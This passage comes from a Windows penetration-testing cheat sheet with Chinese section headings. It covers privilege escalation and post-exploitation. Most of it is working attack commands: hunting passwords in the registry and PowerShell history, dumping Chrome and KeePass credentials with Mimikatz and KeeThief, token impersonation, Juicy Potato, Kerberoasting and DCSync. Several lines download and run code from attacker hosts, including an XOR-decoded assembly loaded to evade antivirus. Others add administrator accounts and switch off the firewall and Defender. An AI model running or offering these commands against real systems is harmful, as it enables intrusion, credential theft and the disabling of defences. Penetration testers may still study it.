<h2 id="4-8-弱文件夹权限"><a href="#4-8-弱文件夹权限" class="headerlink" title="4.8 弱文件夹权限"></a>4.8 弱文件夹权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Full Permissions for &apos;Everyone&apos; on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line"></span><br><span class="line">Modify Permissions for Everyone on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br></pre></td></tr></table></figure>

<h2 id="4-9-计划任务"><a href="#4-9-计划任务" class="headerlink" title="4.9 计划任务"></a>4.9 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>

<h2 id="4-10-Powershell历史"><a href="#4-10-Powershell历史" class="headerlink" title="4.10 Powershell历史"></a>4.10 Powershell历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath | sls passw</span><br></pre></td></tr></table></figure>

<h2 id="4-12-查看已连接的驱动器"><a href="#4-12-查看已连接的驱动器" class="headerlink" title="4.12 查看已连接的驱动器"></a>4.12 查看已连接的驱动器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br><span class="line">wmic logicaldisk get caption,description</span><br><span class="line"></span><br><span class="line">Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root</span><br></pre></td></tr></table></figure>

<h2 id="4-13-查看隐私"><a href="#4-13-查看隐私" class="headerlink" title="4.13 查看隐私"></a>4.13 查看隐私</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">Look for SeImpersonate, SeDebugPrivilege etc</span><br></pre></td></tr></table></figure>

<h2 id="4-14-还有其他人登录吗？"><a href="#4-14-还有其他人登录吗？" class="headerlink" title="4.14 还有其他人登录吗？"></a>4.14 还有其他人登录吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwinsta</span><br></pre></td></tr></table></figure>

<h2 id="4-15-查看注册表自动登录"><a href="#4-15-查看注册表自动登录" class="headerlink" title="4.15 查看注册表自动登录"></a>4.15 查看注册表自动登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br><span class="line"></span><br><span class="line">Get-ItemProperty -Path &apos;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&apos; | select &quot;Default*&quot;</span><br></pre></td></tr></table></figure>

<h2 id="4-16-在凭据管理器中查看存储的凭据"><a href="#4-16-在凭据管理器中查看存储的凭据" class="headerlink" title="4.16 在凭据管理器中查看存储的凭据"></a>4.16 在凭据管理器中查看存储的凭据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">dir C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure>

<h2 id="4-17-查看未引用的服务路径"><a href="#4-17-查看未引用的服务路径" class="headerlink" title="4.17 查看未引用的服务路径"></a>4.17 查看未引用的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &apos;&quot;*&apos;&#125; | select PathName,DisplayName,Name</span><br></pre></td></tr></table></figure>

<h2 id="4-18-查看启动项"><a href="#4-18-查看启动项" class="headerlink" title="4.18 查看启动项"></a>4.18 查看启动项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure>

<h2 id="4-19-检查AlwaysInstalledElevated注册表项"><a href="#4-19-检查AlwaysInstalledElevated注册表项" class="headerlink" title="4.19 检查AlwaysInstalledElevated注册表项"></a>4.19 检查AlwaysInstalledElevated注册表项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<h2 id="4-20-注册表中有密码吗？"><a href="#4-20-注册表中有密码吗？" class="headerlink" title="4.20 注册表中有密码吗？"></a>4.20 注册表中有密码吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>

<h2 id="4-21-剩余的任何Sysrep或无人参与文件"><a href="#4-21-剩余的任何Sysrep或无人参与文件" class="headerlink" title="4.21 剩余的任何Sysrep或无人参与文件"></a>4.21 剩余的任何Sysrep或无人参与文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</span><br><span class="line"></span><br><span class="line">Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-22-GPP（组策略首选项）密码"><a href="#4-22-GPP（组策略首选项）密码" class="headerlink" title="4.22 GPP（组策略首选项）密码"></a>4.22 GPP（组策略首选项）密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan</span><br><span class="line"></span><br><span class="line">\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\</span><br><span class="line"></span><br><span class="line">http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption</span><br><span class="line"></span><br><span class="line">Can also use PowerUP.ps1</span><br></pre></td></tr></table></figure>

<h2 id="4-23-转储Chrome密码（也发布漏洞利用程序）"><a href="#4-23-转储Chrome密码（也发布漏洞利用程序）" class="headerlink" title="4.23 转储Chrome密码（也发布漏洞利用程序）"></a>4.23 转储Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure>

<h2 id="4-24-转储KeePass"><a href="#4-24-转储KeePass" class="headerlink" title="4.24 转储KeePass"></a>4.24 转储KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure>

<h2 id="4-25-令牌模拟"><a href="#4-25-令牌模拟" class="headerlink" title="4.25 令牌模拟"></a>4.25 令牌模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;</span><br><span class="line">Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)</span><br><span class="line"></span><br><span class="line">#Tokenvator https://github.com/0xbadjuju/Tokenvator</span><br><span class="line"></span><br><span class="line">Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...</span><br><span class="line">$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;</span><br><span class="line">[System.Reflection.Assembly]::Load($b) | Out-Null</span><br><span class="line">$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)</span><br><span class="line">[namespace.Class]::Main($parameters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra</span><br></pre></td></tr></table></figure>

<h2 id="4-26-多汁土豆"><a href="#4-26-多汁土豆" class="headerlink" title="4.26 多汁土豆"></a>4.26 多汁土豆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)</span><br><span class="line"></span><br><span class="line">#Reference https://ohpe.it/juicy-potato/</span><br><span class="line"></span><br><span class="line">Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege</span><br><span class="line"></span><br><span class="line">(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.14.5:8000/JuicyPotato.exe&apos;,&apos;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&apos;)</span><br><span class="line"></span><br><span class="line">JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</span><br><span class="line"></span><br><span class="line">Mochan.exe = Payload</span><br><span class="line">5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD</span><br><span class="line"></span><br><span class="line">A CLSID is a GUID that identifies a COM class object</span><br><span class="line"></span><br><span class="line">Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc</span><br><span class="line"></span><br><span class="line">JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL</span><br></pre></td></tr></table></figure>

<h2 id="4-27-烧烤"><a href="#4-27-烧烤" class="headerlink" title="4.27 烧烤"></a>4.27 烧烤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line">Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat</span><br><span class="line"></span><br><span class="line">because Hashcat over John anyday right?</span><br><span class="line"></span><br><span class="line">Invoke-Kerberoast.ps1</span><br><span class="line"></span><br><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount</span><br><span class="line"></span><br><span class="line">Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.</span><br><span class="line"></span><br><span class="line">https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action</span><br></pre></td></tr></table></figure>

<h2 id="4-28-用Python编写的"><a href="#4-28-用Python编写的" class="headerlink" title="4.28 用Python编写的"></a>4.28 用Python编写的</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/kerberoast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMPORTANT: the accepted formats are the following</span><br><span class="line">&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line">&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Look for vulnerable users via LDAP</span><br><span class="line">kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum</span><br><span class="line"></span><br><span class="line">Use ASREP roast against users in the ldapenum_asrep_users.txt file</span><br><span class="line">kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt</span><br><span class="line"></span><br><span class="line">Use SPN roast against users in the ldapenum_spn_users.txt file</span><br><span class="line">kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt</span><br></pre></td></tr></table></figure>

<h2 id="4-29-代表烘焙"><a href="#4-29-代表烘焙" class="headerlink" title="4.29 代表烘焙"></a>4.29 代表烘焙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable</span><br><span class="line"></span><br><span class="line">Get-ASRepHash -Domain m0chanAD.local -User victim</span><br><span class="line"></span><br><span class="line">Can also use Rebeus (Reflectively Load .NET Assembly.)</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asreproast</span><br></pre></td></tr></table></figure>

<h2 id="4-30DCSync（也用于后期利用）"><a href="#4-30DCSync（也用于后期利用）" class="headerlink" title="4.30DCSync（也用于后期利用）"></a>4.30DCSync（也用于后期利用）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. </span><br><span class="line"></span><br><span class="line">#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator</span><br><span class="line"></span><br><span class="line">powershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.6:8000/Invoke-DCSync.ps1&apos;); Invoke-DCSync -PWDumpFormat&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Empire Module: powershell/credentials/mimikatz/dcsync_hashdump</span><br></pre></td></tr></table></figure>

<h1 id="0x05-exploit后"><a href="#0x05-exploit后" class="headerlink" title="0x05 exploit后"></a>0x05 exploit后</h1><h2 id="5-1-有用的命令"><a href="#5-1-有用的命令" class="headerlink" title="5.1 有用的命令"></a>5.1 有用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net localgroup Administrators m0chan /add</span><br><span class="line"></span><br><span class="line"># Enable RDP</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Turn firewall off</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">Or like this</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">If you get this error:</span><br><span class="line"></span><br><span class="line">CredSSP Error Fix -&gt;</span><br><span class="line"></span><br><span class="line">Add this reg key:</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Disable Windows Defender</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure>

<h2 id="5-2-Esenutl-exe转储锁定文件"><a href="#5-2-Esenutl-exe转储锁定文件" class="headerlink" title="5.2 Esenutl.exe转储锁定文件"></a>5.2 Esenutl.exe转储锁定文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)</span><br></pre></td></tr></table></figure>

<h2 id="5-3-检查是否已启用Powershell日志记录"><a href="#5-3-检查是否已启用Powershell日志记录" class="headerlink" title="5.3 检查是否已启用Powershell日志记录"></a>5.3 检查是否已启用Powershell日志记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure>

<h2 id="5-4-Run-Seatbelt（绝对必须）"><a href="#5-4-Run-Seatbelt（绝对必须）" class="headerlink" title="5.4 Run Seatbelt（绝对必须）"></a>5.4 Run Seatbelt（绝对必须）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/Seatbelt</span><br><span class="line"></span><br><span class="line">This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win</span><br><span class="line"></span><br><span class="line">BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)</span><br><span class="line">RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13</span><br><span class="line">TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)</span><br><span class="line">UACSystemPolicies     -   UAC system policies via the registry</span><br><span class="line">PowerShellSettings    -   PowerShell versions and security settings</span><br><span class="line">AuditSettings         -   Audit settings via the registry</span><br><span class="line">WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry</span><br><span class="line">LSASettings           -   LSA settings (including auth packages)</span><br><span class="line">UserEnvVariables      -   Current user environment variables</span><br><span class="line">SystemEnvVariables    -   Current system environment variables</span><br><span class="line">UserFolders           -   Folders in C:\Users\</span><br><span class="line">NonstandardServices   -   Services with file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">InternetSettings      -   Internet settings including proxy configs</span><br><span class="line">LapsSettings          -   LAPS settings, if installed</span><br><span class="line">LocalGroupMembers     -   Members of local admins, RDP, and DCOM</span><br><span class="line">MappedDrives          -   Mapped drives</span><br><span class="line">RDPSessions           -   Current incoming RDP sessions</span><br><span class="line">WMIMappedDrives       -   Mapped drives via WMI</span><br><span class="line">NetworkShares         -   Network shares</span><br><span class="line">FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all</span><br><span class="line">AntiVirusWMI          -   Registered antivirus (via WMI)</span><br><span class="line">InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools</span><br><span class="line">RegistryAutoRuns      -   Registry autoruns</span><br><span class="line">RegistryAutoLogon     -   Registry autologon information</span><br><span class="line">DNSCache              -   DNS cache entries (via WMI)</span><br><span class="line">ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)</span><br><span class="line">AllTcpConnections     -   Lists current TCP connections and associated processes</span><br><span class="line">AllUdpConnections     -   Lists current UDP connections and associated processes</span><br><span class="line">NonstandardProcesses  -   Running processeswith file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">  *  If the user is in high integrity, the following additional actions are run:</span><br><span class="line">SysmonConfig          -   Sysmon configuration from the registry</span><br><span class="line"></span><br><span class="line">And more!!</span><br></pre></td></tr></table></figure>

